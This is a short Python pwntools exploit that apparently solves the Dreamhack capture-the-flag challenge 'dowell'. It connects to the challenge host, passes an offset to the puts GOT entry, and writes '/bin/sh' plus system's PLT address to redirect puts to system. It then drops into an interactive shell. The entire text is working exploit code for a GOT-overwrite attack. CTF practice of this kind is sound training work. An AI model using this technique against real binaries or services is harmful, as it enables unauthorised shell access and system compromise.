from pwn import *

port = 18798
rem = remote("host3.dreamhack.games", port)

elf = ELF("./Pwnable/dowell/problem/deploy/prob")

puts_got = elf.got['puts']
system_plt = elf.plt['system']

rem.sendlineafter(b"pt: ", str(puts_got - 8).encode())
rem.sendlineafter(b"input: ", b"/bin/sh\00" + p64(system_plt))
rem.recvuntil(b"input:")

rem.interactive()